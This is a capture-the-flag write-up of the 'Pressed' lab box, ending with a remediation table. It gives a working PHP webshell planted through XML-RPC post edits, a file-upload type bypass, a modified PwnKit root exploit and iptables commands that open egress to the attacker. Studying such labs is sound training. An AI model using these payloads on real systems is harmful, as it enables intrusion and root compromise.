# UHC: Pressed — Owning WordPress admin without ever logging in

[![Difficulty](https://img.shields.io/badge/difficulty-Event-blueviolet)](https://www.youtube.com/watch?v=p8mIdm93mfw)
[![OS](https://img.shields.io/badge/OS-Linux-blue)](https://www.youtube.com/watch?v=p8mIdm93mfw)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=p8mIdm93mfw)

> **Attack path:** leaked `wp-config.php.bak` → year-bumped admin password → blocked by TOTP 2FA → abuse XML-RPC API → post source leak shows PHP Everywhere plugin → webshell via `wp.editPost` → egress firewall kills reverse shells → PwnKit (CVE-2021-4034) retooled to run blind over the webshell → root.

Pressed was the UHC (Ultimate Hacker's Championship) January Finals box for 2022, built by IppSec. It is a WordPress exploitation clinic: valid admin credentials from the start, but the GUI is locked behind 2FA — so everything happens through the XML-RPC API instead.

## 1 · Reconnaissance

### Port scan

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.142
nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.142
# 80/tcp open  http  Apache httpd 2.4.41 (Ubuntu)
# http-generator: WordPress 5.9, title: "UHC Jan Finals"
```

The site redirects to `pressed.htb`:

```bash
echo "10.10.11.142 pressed.htb" >> /etc/hosts
```

### Website

A single WordPress post (`/index.php/2022/01/28/hello-world/`) renders a live-updating table of visitor User-Agent strings — a strong hint that PHP code inside the post is reading a log file. Comments are stuck in moderation, so no stored-XSS route.

### wpscan

```bash
wpscan --url http://pressed.htb --api-token $WPSCAN_API
```

Two results matter:

- `XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php`
- Config backup identified: `http://pressed.htb/wp-config.php.bak`

### Leaked credentials

`wget http://pressed.htb/wp-config.php.bak` and read it:

```php
define( 'DB_USER', 'admin' );
define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );
```

## 2 · Foothold

### Credential surgery

`admin` / `uhc-jan-finals-2021` fails at `/wp-login.php`. The password smells like a year-rotated convention — bump it: `uhc-jan-finals-2022` is accepted... but the login lands on a **TOTP 2FA prompt**, and there is no seed to be had. Dead end for the GUI — not for the API.

### XML-RPC enumeration

`system.listMethods` needs no auth:

```bash
curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" \
  http://pressed.htb/xmlrpc.php
```

Besides the usual `wp.*` methods, the list contains a custom one: `htb.get_flag`:

```bash
curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>" \
  http://pressed.htb/xmlrpc.php
```

It returns the **user flag** directly (no authentication required).

### Authenticated API work with python-wordpress-xmlrpc

XML-RPC ignores the 2FA that guards the web GUI:

```bash
pip install python-wordpress-xmlrpc
python
>>> from wordpress_xmlrpc import Client
>>> from wordpress_xmlrpc.methods import posts
>>> client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
>>> plist = client.call(posts.GetPosts())
>>> print(plist[0].content)
```

### Reading the post source

The post content includes a Gutenberg block:

```
<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhw...","version":"3.0.0"} /-->
```

URL- then base64-decode it (CyberChef handles both):

```php
<?php  echo(file_get_contents('/var/www/html/output.log')); ?>
```

The User-Agent table is generated by the **PHP Everywhere** plugin executing PHP embedded in the post. Admin write access to the post is therefore code execution as `www-data`.

### Writing a webshell via wp.editPost

Edit the post, keeping the original content but swapping the block's `code` value for a URL+base64-encoded version of:

```php
<?php
  echo(file_get_contents('/var/www/html/output.log'));
  if ($_SERVER['REMOTE_ADDR'] == '10.10.14.6') {
    system($_REQUEST['cmd']);
  }
?>
```

```python
>>> mod_post = plist[0]
>>> mod_post.content = '<!-- wp:paragraph -->\n<p>...original text...</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"<url+base64 of webshell>","version":"3.0.0"} /-->\n...'
>>> client.call(posts.EditPost(mod_post.id, mod_post))
```

The conditional keeps the shell invisible to other players hitting the shared event instance. Trigger it:

```bash
curl -d "cmd=id" -s 'http://pressed.htb/index.php/2022/01/28/hello-world/'
# uid=33(www-data)
```

## 3 · User flag

Already captured through `htb.get_flag` during recon — the unauthenticated XML-RPC method is the box's gift for careful enumeration. (`<flag>`)

## 4 · Privilege escalation

### Egress firewall

Every callback dies: reverse shells, `nc`, `curl`, even ICMP all time out. All further work is blind command execution through the webshell:

```bash
./webshell.sh 'ping -c 1 10.10.14.6'
# 1 packets transmitted, 0 received, 100% packet loss
```

### Spotting PwnKit (CVE-2021-4034)

UHC boxes showcase trending CVEs, and it is early 2022 — PwnKit season. The version string is useless here (patching did not bump it), but the build date gives it away:

```bash
./webshell.sh 'ls -l /usr/bin/pkexec'
# -rwsr-xr-x 1 root root 31032 Jul 14 2021 /usr/bin/pkexec   # pre-patch
```

### Retooling the exploit for blind execution

Grab the Kim Schulz shell-script PoC. A root *shell* is useless over a webshell, so edit the payload written to `pkwner.c` — replace the `/bin/bash` spawn with the command you want, e.g. `id`:

```c
void gconv_init() {
  setuid(0); setgid(0); seteuid(0); setegid(0);
  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
         "rm -rf 'GCONV_PATH=.' 'pkwner';"
         "id");
  exit(0);
}
```

### Uploading through wp.uploadFile

Upload via XML-RPC — the media library rejects `.sh` ("not allowed to upload this file type"), so send it as `pkwner.png`:

```python
>>> from wordpress_xmlrpc.methods import media
>>> data = { 'name': 'pkwner.png', 'bits': script, 'type': 'text/plain' }
>>> client.call(media.UploadFile(data))
# {'link': '/wp-content/uploads/2022/02/pkwner.png', ...}
```

Run it through the webshell:

```bash
./webshell.sh 'bash /var/www/html/wp-content/uploads/2022/02/pkwner.png'
# uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

## 5 · Root flag

Swap the embedded command for `cat /root/root.txt`, re-upload, run again — the flag comes back through the webshell (`<flag>`).

### Beyond the flag: getting a real shell

With blind root execution, take down the egress firewall itself:

```bash
iptables -A OUTPUT -p tcp -d 10.10.14.6 -j ACCEPT
iptables -A INPUT  -p tcp -s 10.10.14.6 -j ACCEPT
```

Now reverse shells connect, and a full root shell lands on the box.

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| World-readable `wp-config.php.bak` | Database/admin credential disclosure | Never leave backup files in the web root; block dotfiles and `*.bak` at the web server |
| Password scheme guessable from a leaked older value | One-character "year bump" recovers the live admin password | Use long random passwords; avoid patterns derived from predictable context |
| XML-RPC enabled while the GUI enforces 2FA | 2FA fully bypassed for API-authenticated actions | Disable XML-RPC or apply the same second factor to API/ application passwords |
| PHP Everywhere plugin executing code inside posts | Admin-equivalent RCE as `www-data` | Remove exec-capable plugins from production; allow PHP execution only for trusted roles, if at all |
| Unpatched `pkexec` (CVE-2021-4034, SUID root) | Local root from any user on the host | Patch polkit promptly; monitor binary build dates, not just package versions |

## 7 · CPTS takeaways

- When credentials work but 2FA blocks the dashboard, pivot to alternative auth surfaces — XML-RPC (`system.listMethods` first) often skips controls the web UI enforces.
- Custom/unusual XML-RPC methods (like `htb.get_flag`) are pure enumeration wins; always list methods before diving into brute force.
- Adapting a public privilege-escalation exploit to your access level (blind single-command execution instead of an interactive shell) is exactly the kind of improvisation CPTS scenarios reward.
- File-upload allowlist bypass via double extension / content-type confusion (`.sh` content as `.png`) remains a staple trick.
- Hostile egress filtering is increasingly common in exams: practice webshell-driven enumeration, forward shells, and firewall tampering with `iptables` rather than assuming a callback is always possible.
